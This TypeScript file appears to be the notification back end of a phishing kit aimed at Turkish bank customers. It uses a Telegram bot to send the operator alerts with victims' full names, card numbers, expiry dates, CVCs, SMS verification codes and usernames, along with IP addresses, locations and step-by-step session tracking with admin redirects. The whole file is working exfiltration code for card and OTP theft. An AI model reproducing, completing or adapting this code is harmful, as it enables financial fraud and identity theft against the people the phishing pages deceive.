import { Bot } from "grammy";
import type { AuditEventPayload } from "./audit-event";

export type ServerAuditRow = AuditEventPayload & {
  created_at?: string | null;
  id?: number | string | null;
};

export function getConfig() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const webhookSecret = process.env.TELEGRAM_WEBHOOK_SECRET;
  return {
    configured: Boolean(
      token && String(token).trim().length > 5 && chatId && String(chatId).trim().length > 3,
    ),
    token: token ? String(token).trim() : null,
    chatId: chatId ? String(chatId).trim() : null,
    webhookSecret: webhookSecret ? String(webhookSecret).trim() : null,
  };
}

export function isTelegramConfigured(): boolean {
  return getConfig().configured;
}

let botInstance: Bot | null = null;
export function getTelegramBot(): Bot | null {
  const cfg = getConfig();
  if (!cfg.token) return null;
  if (!botInstance) botInstance = new Bot(cfg.token);
  return botInstance;
}

function escapeHTML(s: unknown): string {
  if (s === null || s === undefined) return "";
  const str = String(s);
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function ts(createdAt?: string | null): string {
  if (!createdAt) return "-";
  try {
    const d = new Date(createdAt);
    if (Number.isNaN(d.getTime())) return String(createdAt).slice(0, 19);
    return d.toLocaleString("tr-TR", { timeZone: "Europe/Istanbul", hour12: false });
  } catch {
    return String(createdAt).slice(0, 19);
  }
}

export function formatAuditEventForTelegram(row: ServerAuditRow): string {
  const kind = String(row.event_kind ?? "?");
  const action = String(row.event_action ?? "?");
  const status = String(row.status ?? "ok");

  let emoji = "ℹ️";
  let title = "";
  const short = `${kind}:${action}`;

  if (kind === "submit" || action.includes("submit") || action.includes("form")) {
    if (action.includes("card") || action.includes("kart")) {
      emoji = "💳";
      title = "KART BİLGİSİ GİRİLDİ";
    } else if (action.includes("sms")) {
      emoji = "📱";
      title = "SMS KODU GİRİLDİ";
    } else if (action.includes("bank") || action.includes("win")) {
      emoji = "📝";
      title = "FORM GÖNDERİLDİ";
    } else {
      emoji = "✅";
      title = "FORM GÖNDERİLDİ";
    }
  } else if (kind === "step") {
    if (action.includes("redirect")) {
      if (action.includes("back") || action.includes("sync_from_back")) {
        emoji = "↪️";
        title = "GERİ DÖNÜŞ / ADIM DEĞİŞTİ";
      } else if (action.includes("server") || action.includes("admin")) {
        emoji = "🔀";
        title = "ADMIN YÖNLENDİRMESİ";
      } else {
        emoji = "➡️";
        title = "YÖNLENDİRME";
      }
    } else if (action.includes("back") || action.includes("db_step_sync")) {
      emoji = "↩️";
      title = "GERİ TUŞU / ADIM GERİ";
    } else if (action.includes("wait_mount") || action === "wait") {
      emoji = "⏳";
      title = "BEKLEME SAYFASINA GİRDİ";
    } else {
      emoji = "👣";
      title = "ADIM DEĞİŞTİ";
    }
  } else if (kind === "presence") {
    if (action.includes("online")) {
      emoji = "🟢";
      title = "ONLINE OLDU";
    } else if (action.includes("offline")) {
      emoji = "⚪";
      title = "OFFLINE OLDU";
    } else if (action.includes("pulse") || action.includes("heartbeat") || action.includes("ping")) {
      emoji = "💓";
      title = "PRESENCE PULSE";
    } else {
      emoji = "📡";
      title = "PRESENCE";
    }
  } else if (kind === "route") {
    emoji = "🧭";
    title = "ROUTE";
  } else if (kind === "bank_form") {
    emoji = "🏦";
    title = "BANKA FORMU";
  } else if (kind === "error") {
    emoji = "⛔";
    title = "HATA";
  } else if (kind === "auth") {
    emoji = "🔐";
    title = "AUTH";
  } else if (action.includes("ban") || action.includes("unban")) {
    if (action.includes("unban")) {
      emoji = "♻️";
      title = "BAN KALDIRILDI";
    } else if (action.includes("ban")) {
      emoji = "🚫";
      title = "IP BANLANDI";
    } else {
      emoji = "🛡️";
      title = "IP İŞLEMİ";
    }
  }

  if (!title) title = short.toUpperCase();

  const lines: string[] = [];
  lines.push(`${emoji} <b>${escapeHTML(title)}</b> <code>[${escapeHTML(status)}]</code>`);
  lines.push(`<i>${escapeHTML(short)}</i>`);

  if (row.session_id || row.public_id) {
    const sid = row.session_id ? String(row.session_id).slice(0, 12) : "";
    const pid = row.public_id ? String(row.public_id).slice(0, 12) : "";
    lines.push(`👤 Session: <code>${escapeHTML(sid || pid || "-")}</code>`);
  }

  if (row.from_step || row.to_step) {
    const f = row.from_step || "-";
    const t = row.to_step || "-";
    lines.push(`🔁 <b>${escapeHTML(f)}</b> → <b>${escapeHTML(t)}</b>`);
  }

  if (row.bank_name || row.bank_slug) {
    lines.push(`🏦 <b>${escapeHTML(row.bank_name || row.bank_slug)}</b>`);
  }

  if (row.user_ip) {
    const loc = [row.country, row.city].filter(Boolean).map(escapeHTML).join(", ") || "";
    lines.push(`🌐 <code>${escapeHTML(row.user_ip)}</code>${loc ? ` - ${loc}` : ""}`);
  }

  if (row.pathname || row.current_url) {
    const p = row.pathname || row.current_url || "";
    if (p) lines.push(`📍 <code>${escapeHTML(String(p).slice(0, 140))}</code>`);
  }

  if (row.admin_email || row.admin_action) {
    lines.push(`👮 Admin: <b>${escapeHTML(row.admin_email || "-")}</b> <code>${escapeHTML(row.admin_action || "")}</code>`);
  }

  if (row.error_name || row.error_message) {
    lines.push(`❌ Hata: <b>${escapeHTML(row.error_name || "")}</b> — <code>${escapeHTML(String(row.error_message || "").slice(0, 400))}</code>`);
  }

  if (row.meta && typeof row.meta === "object" && Object.keys(row.meta).length < 40) {
    const m = row.meta as Record<string, any>;
    const important: string[] = [];
    const pick = (key: string, label: string, limit: number = 60) => {
      const v = m[key];
      if (v !== undefined && v !== null && String(v).trim().length > 0) {
        important.push(`${label}: <code>${escapeHTML(String(v).slice(0, limit))}</code>`);
      }
    };
    if (typeof m.form_data === "object" && m.form_data) {
      const fd = m.form_data as Record<string, any>;
      for (const [k, v] of Object.entries(fd).slice(0, 6)) {
        if (String(v).trim().length > 0 && typeof v !== "object") {
          m[`fd_${k}`] = v;
        }
      }
    }
    pick("fullName", "👤İsim", 80);
    pick("fd_fullName", "👤İsim", 80);
    pick("firstName", "👤Ad", 40);
    pick("lastName", "👤Soyad", 40);
    pick("smsCode", "📱SMS", 10);
    pick("fd_smsCode", "📱SMS", 10);
    pick("cardNumber", "💳KartNo", 32);
    pick("fd_cardNumber", "💳KartNo", 32);
    pick("cardExpiry", "💳SonKul", 8);
    pick("cardCvc", "💳CVC", 6);
    pick("bankSlug", "🏦Slug", 40);
    pick("bankName", "🏦Ad", 50);
    pick("loginMethod", "🔐Giris", 30);
    pick("username", "👤KAd", 40);
    pick("reason", "Sebep", 200);
    if (important.length === 0) {
      const keys = Object.keys(m).filter(
        (k) =>
          String(m[k]) !== undefined &&
          m[k] !== null &&
          String(m[k]).trim() !== "" &&
          typeof m[k] !== "object" &&
          k !== "form_data",
      );
      for (const k of keys.slice(0, 5)) {
        if (important.length >= 6) break;
        important.push(`${escapeHTML(k)}: <code>${escapeHTML(String(m[k]).slice(0, 80))}</code>`);
      }
    }
    if (important.length > 0) lines.push("🔎 " + important.join(" • "));
  }

  lines.push(`🕒 ${escapeHTML(ts(row.created_at))}`);

  let out = lines.join("\n").trim();
  if (out.length > 4000) out = out.slice(0, 3990) + "\n…";
  return out;
}

export async function notifyAuditEventsToTelegram(
  rows: ServerAuditRow[],
): Promise<{ sent: number; errors: number }> {
  if (!rows || rows.length === 0) return { sent: 0, errors: 0 };
  const cfg = getConfig();
  if (!cfg.token || !cfg.chatId) return { sent: 0, errors: 0 };
  const bot = getTelegramBot();
  if (!bot) return { sent: 0, errors: 0 };

  // --- SPAM filtresi: TÜM "presence" eventlerini TELEGRAM'A ATMA (sayfa görünürlük/sekme/heartbeat/abonelik spamdir) ---
  // Sadece gerçek aksiyonlar gönderilsin: form, auth, redirect, ban, vb. Presence'ler DB'de dursun ama TG yok.
  const filtered = rows.filter((r) => {
    const k = String(r.event_kind || "").toLowerCase();
    if (k === "presence") return false; // presence_subscribe / pagehide / pagevis / hidden / pulse / heartbeat HEPSI atlanir
    const a = String(r.event_action || "").toLowerCase();
    if (a.includes("pulse") || a.includes("heartbeat") || a.includes("ping")) return false;
    return true;
  });

  if (filtered.length === 0) return { sent: 0, errors: 0 };

  let sent = 0;
  let errors = 0;

  // --- 10 evente kadar birleştir, tek mesajda gönder ---
  const chunks: string[][] = [[]];
  for (const r of filtered) {
    const line = formatAuditEventForTelegram(r);
    const last = chunks[chunks.length - 1];
    const candidate = last.length === 0 ? line : last.join("\n\n") + "\n\n" + line;
    if (last.length > 0 && (candidate.length > 3800 || last.length >= 10)) {
      chunks.push([line]);
    } else {
      last.push(line);
    }
  }

  for (const chunk of chunks) {
    if (chunk.length === 0) continue;
    const text = chunk.join("\n\n");
    try {
      await bot.api.sendMessage(cfg.chatId, text, {
        parse_mode: "HTML",
        link_preview_options: { is_disabled: true },
      });
      sent += chunk.length;
    } catch (err: unknown) {
      errors += chunk.length;
      try {
        console.error(
          "[telegram] sendMessage failed",
          err instanceof Error ? err.message : String(err),
        );
      } catch {}
      // Hata sonrası parçalayarak tek dene
      if (chunk.length > 1) {
        for (const line of chunk) {
          try {
            await bot.api.sendMessage(cfg.chatId, line, {
              parse_mode: "HTML",
              link_preview_options: { is_disabled: true },
            });
            sent++;
            errors--;
          } catch {
            errors++;
          }
        }
      }
    }
  }
  return { sent, errors };
}

export async function sendTelegramTestMessage(
  extraText?: string,
): Promise<{ ok: boolean; error?: string }> {
  const cfg = getConfig();
  if (!cfg.token || !cfg.chatId)
    return { ok: false, error: "TELEGRAM_BOT_TOKEN ve/veya TELEGRAM_CHAT_ID tanımlı değil" };
  const bot = getTelegramBot();
  if (!bot) return { ok: false, error: "Bot oluşturulamadı" };
  try {
    const text =
      `✅ <b>Telegram Bot Bağlantısı Başarılı</b>\n\n🕒 ${escapeHTML(
        new Date().toLocaleString("tr-TR", { timeZone: "Europe/Istanbul" }),
      )}${extraText ? `\n\n${escapeHTML(extraText)}` : ""}`;
    await bot.api.sendMessage(cfg.chatId, text, { parse_mode: "HTML", link_preview_options: { is_disabled: true } });
    return { ok: true };
  } catch (e: any) {
    return { ok: false, error: e?.message || String(e) };
  }
}

export function getTelegramChatId(): string | null {
  return getConfig().chatId;
}
export function getTelegramWebhookSecret(): string | null {
  return getConfig().webhookSecret;
}
export { escapeHTML as escapeTelegramHTML };
